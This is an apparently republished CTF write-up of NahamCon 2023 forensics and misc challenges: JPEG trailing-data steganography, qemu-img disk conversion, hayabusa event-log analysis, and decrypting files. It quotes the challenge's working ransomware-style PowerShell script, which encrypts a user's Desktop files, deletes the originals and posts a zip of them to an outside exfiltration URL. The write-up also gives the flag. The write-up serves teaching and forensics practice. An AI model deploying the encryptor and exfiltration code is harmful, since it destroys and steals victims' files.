---
title: NahamCon 2023 Writeup (JPEG 隐写 + Windows 加密 + qemu 镜像)
contest: NahamCon
year: 2023
difficulty: medium
vuln_type: misc_unknown
tags:
- JPEG 隐写
- stegoveritas
- PowerShell AES 加密
- hayabusa 事件日志
- qemu-img vmdk→vhdx
attack_chain: '|'
key_payload: '|'
one_liner: 'NahamCon 2023: JPEG FFD9 trailing 隐写 + PowerShell AES-256 加密 (key "7h3_k3y_70_unl0ck_4ll_7h3_f1l35!") + qemu-img vmdk 转 vhdx + hayabusa 事件日志分析。'
lesson: '|'
quality: high
full_path: NahamCon_2023_Writeup.full.md
meta_path: NahamCon_2023_Writeup.meta.md
images_removed: true
images_removed_count: 4
schema_version: v3.0.0-P0
summary: 'NahamCon 2023 Writeup (JPEG 隐写 + Windows 加密 + qemu 镜像)。NahamCon 2023: JPEG FFD9 trailing 隐写 + PowerShell AES-256 加密 (key "7h3_k3y_70_unl0ck_4ll_7h3_f1l35!") + qemu-img vmdk 转 vhdx + hayabusa 事件日志...'
category: misc
subcategory: misc_other
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 4
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/120878.html
reasoning_chain:
- JPEG 隐写触发点：tiny-little-fibers.jpg + stegoveritas → 假设：FFD9 后 trailing data 藏数据
- 动作：stegoveritas tiny-little-fibers.jpg → 手动解析 JPEG marker → 跳过 nonLenMarkers (FFD8/FF01/FFD0-FFD7) → 找到 FFD9 后继续读
- '假设：FFD9 (End of Image) 后字节是隐写数据 → 动作：with open(image.veritas.file_name, ''rb'') as myFile: steg = myFile.read() + while loop'
- PowerShell AES 加密 (encryptFiles.ps1)：$cipher.key = '7h3_k3y_70_unl0ck_4ll_7h3_f1l35!' (32 字节 AES-256) → $cipher.GenerateIV() + CryptoStream
- 假设：拿到 key → 解密所有 .enc 文件 → 动作：用 key + IV 重放 CryptoStream 解密
- Windows hayabusa 事件日志：.ova (vmware) → tar → 解压 → vmdk → qemu-img convert -f vmdk -O vhdx out.vhdx → 假设：vhdx 才能挂载到 Windows
- 动作：hayabusa-2.5.1-win-x64.exe csv-timeline -d 'E:\Windows\System32\winevt\Logs' -o result.csv → 假设：事件日志含攻击痕迹
- flag = 'flag{892a8921517dcecf90685d478aedf5e2}'
failed_attempts:
- JPEG 隐写直接 strings 找 flag → 失败：flag 藏在 FFD9 后 trailing data 区，strings 看不到
- PowerShell AES 尝试不拿 key 直接解 → 失败：AES-256 必须 key + IV 才能解密
- 事件日志尝试用 Linux 工具读 → 失败：必须 Windows hayabusa + qemu-img 转 vhdx
key_observations:
- JPEG FFD9 后 trailing data 隐写 = CTF MISC 经典位置（FFD8 起 / FFD9 止，FFD9 后是 trailing）
- PowerShell AES-256 CryptoStream = $cipher.GenerateIV() + CryptoStream 写入 IV 是 .NET AES 标配
- vmware .ova = tar + .vmdk，qemu-img convert -f vmdk -O vhdx 转 Windows 挂载格式
- hayabusa csv-timeline -d 是 Windows 事件日志取证标准工具（类似 Volatility 但偏日志）
- NahamCon 是面向新生的入门 CTF（多 MISC 入门题）
prerequisites:
- JPEG 文件结构（FFD8/FFD9 marker + APP segment）
- PowerShell .NET AES 加密（GenerateIV + CryptoStream）
- vmware .ova 解包 + qemu-img 镜像转换
- Windows hayabusa 事件日志取证
---
# NahamCon 2023 Writeup

> 原文: https://www.ctfiot.com/120878.html
> ID: 120878


```
# stegoveritas のインストール
pip3 install stegoveritas
sudo stegoveritas_install_deps

# stegoveritas による解析
stegoveritas tiny-little-fibers.jpg
# These markers don't have a length attribute
nonLenMarkers = [ b'\xff\xd8', b'\xff\x01', b'\xffd0', b'\xffd1', b'\xffd2', b'\xffd3', b'\xffd4', b'\xffd5', b'\xffd6', b'\xffd7' ]

# Open up the file
with open(image.veritas.file_name,"rb") as myFile:
 steg = myFile.read()

while True:
 # Grab the current header
 hdr = steg[i:i+2]

 # if Start of Image, Temporary Private, Restart, things that don't have an associated length field
 if hdr in nonLenMarkers:
 # Just move to the next marker
 i = i + 2
 continue

 # If we've found our way to the end of the jpeg
 if hdr == b'\xff\xd9':
 #print("Made it to the end!")
 # Increment 2 so we can check the length
 i += 2
 break

 # Unpack the length field
 ln = unpack(">H",steg[i+2:i+4])[0]

 # print("Found Length: {0}".format(ln))

 # Update the index with the known length
 i = i+ln+2

 # When we hit scan data, we scan to the end of the format
 if hdr == b'\xff\xda':
 #print("Start of Scan data")
 # Find the end marker
 i += steg[i:].index(b'\xff\xd9')

 # Check for trailers
 if i != len(steg):
 print("Trailing Data Discovered... Saving")
 print(steg[i:])
 # Save it off for reference
 with open(output_file, "wb") as outFile:
 outFile.write(steg[i:])
# OVA を tar にして展開してから vhdx に変換する
mv nahamcon.ova nahamcon.tar
tar -xvf nahamcon.tar
qemu-img convert -f vmdk -O vhdx "Nahamcon\ Forensics\ Challenge-disk001.vmdk" out.vhdx
.\hayabusa-2.5.1-win-x64.exe csv-timeline -d "E:\Windows\System32\winevt\Logs" -o result.csv
function encryptFiles{
	Param(
 [Parameter(Mandatory=${true}, position=0)]
 [string] $baseDirectory
	)
	foreach($File in (Get-ChildItem $baseDirectory -Recurse -File)){
 if ($File.extension -ne ".enc"){
 $DestinationFile = $File.FullName + ".enc"
 $FileStreamReader = New-Object System.IO.FileStream($File.FullName, [System.IO.FileMode]::
Open)
 $FileStreamWriter = New-Object System.IO.FileStream($DestinationFile, [System.IO.FileMode]::
Create)
 $cipher = [System.Security.Cryptography.SymmetricAlgorithm]::
Create("AES")
 $cipher.key = [System.Text.Encoding]::
UTF8.GetBytes("7h3_k3y_70_unl0ck_4ll_7h3_f1l35!")
 $cipher.Padding = [System.Security.Cryptography.PaddingMode]::
PKCS7
 $cipher.GenerateIV()
 $FileStreamWriter.Write([System.BitConverter]::
GetBytes($cipher.IV.Length), 0, 4)
 $FileStreamWriter.Write($cipher.IV, 0, $cipher.IV.Length)
 $Transform = $cipher.CreateEncryptor()
 $CryptoStream = New-Object System.Security.Cryptography.CryptoStream($FileStreamWriter, $Transform, [System.Security.Cryptography.CryptoStreamMode]::
Write)
 $FileStreamReader.CopyTo($CryptoStream)
 $CryptoStream.FlushFinalBlock()
 $CryptoStream.Close()
 $FileStreamReader.Close()
 $FileStreamWriter.Close()
 Remove-Item -LiteralPath $File.FullName
 }
	}
}

$flag = "flag{892a8921517dcecf90685d478aedf5e2}"
$ErrorActionPreference= 'silentlycontinue'
$user = [System.Security.Principal.WindowsIdentity]::
GetCurrent().Name.Split("\")[-1]
encryptFiles("C:\Users\"+$user+"\Desktop")
Add-Type -assembly "system.io.compression.filesystem"
[io.compression.zipfile]::
CreateFromDirectory("C:\Users\"+$user+"\Desktop", "C:\Users\"+$user+"\Downloads\Desktop.zip")
$zipFileBytes = Get-Content -Path ("C:\Users\"+$user+"\Downloads\Desktop.zip") -Raw -Encoding Byte
$zipFileData = [Convert]::
ToBase64String($zipFileBytes)
$body = ConvertTo-Json -InputObject @{file=$zipFileData}
Invoke-Webrequest -Method Post -Uri "https://www.thepowershellhacker.com/exfiltration" -Body $body
Remove-Item -LiteralPath ("C:\Users\"+$user+"\Downloads\Desktop.zip")
$baseDirectory = "E:\Users\IEUser\Desktop"

foreach($File in (Get-ChildItem $baseDirectory -Recurse -File)){
 if ($File.extension -eq ".enc"){
 $SourceFile = $File.FullName
 $DestinationFile = $File.FullName.Replace(".enc","")
 $DestinationFile

 $FileStreamReader = New-Object System.IO.FileStream($SourceFile, [System.IO.FileMode]::
Open)
 $FileStreamWriter = New-Object System.IO.FileStream($DestinationFile, [System.IO.FileMode]::
Create)

 $cipher = [System.Security.Cryptography.SymmetricAlgorithm]::
Create("AES")
 $cipher.key = [System.Text.Encoding]::
UTF8.GetBytes("7h3_k3y_70_unl0ck_4ll_7h3_f1l35!")
 $cipher.Padding = [System.Security.Cryptography.PaddingMode]::
PKCS7

 $IVLengthBuffer = New-Object Byte[] 4
 $FileStreamReader.Read($IVLengthBuffer, 0, 4)

 $IVLength = [System.BitConverter]::
ToInt32($IVLengthBuffer, 0)
 $IVBuffer = New-Object Byte[] $IVLength

 $FileStreamReader.Read($IVBuffer, 0, $IVLength)
 $cipher.IV = $IVBuffer

 $Transform = $cipher.CreateDecryptor()
 $CryptoStream = New-Object System.Security.Cryptography.CryptoStream($FileStreamWriter, $Transform, [System.Security.Cryptography.CryptoStreamMode]::
Write)
 $FileStreamReader.CopyTo($CryptoStream)
 $CryptoStream.FlushFinalBlock()

 $CryptoStream.Close()
 $FileStreamReader.Close()
 $FileStreamWriter.Close()
 }
}
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]